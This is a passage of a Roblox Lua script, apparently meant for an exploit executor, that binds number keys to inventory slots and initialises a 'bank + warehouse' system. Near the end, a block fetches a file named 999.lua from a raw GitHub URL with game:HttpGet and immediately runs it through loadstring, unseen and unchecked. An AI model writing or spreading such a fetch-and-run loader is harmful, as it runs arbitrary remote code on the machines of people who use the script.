    game:GetService("UserInputService")

local SlotKeyCodes = {
    Enum.KeyCode.One,
    Enum.KeyCode.Two,
    Enum.KeyCode.Three,
    Enum.KeyCode.Four,
    Enum.KeyCode.Five,
    Enum.KeyCode.Six,
    Enum.KeyCode.Seven,
    Enum.KeyCode.Eight,
}

UserInputService.InputBegan:Connect(function(input,processed)
    if processed then
        return
    end

    if UserInputService:GetFocusedTextBox() then
        return
    end

    for i,keyCode in ipairs(SlotKeyCodes) do
        if input.KeyCode == keyCode then
            ActivateSlot(i)
            break
        end
    end
end)

--==================================================
-- 初始化
--==================================================

UpdateStars()
UpdateSlots()
UpdateWarehouse()
UpdateMoney()

--==================================================
-- 自动运行远程 999.lua
--==================================================

task.spawn(function()
    local success,err = pcall(function()
        local source = game:HttpGet(
            "https://raw.githubusercontent.com/jiyudanj-stack/-78/main/999.lua"
        )

        local fn = loadstring(source)

        assert(
            type(fn) == "function",
            "999.lua 编译失败"
        )

        fn()
    end)

    if not success then
        warn("[999.lua] 自动运行失败：",err)
    end
end)

print("银行 + 仓库系统加载完成")
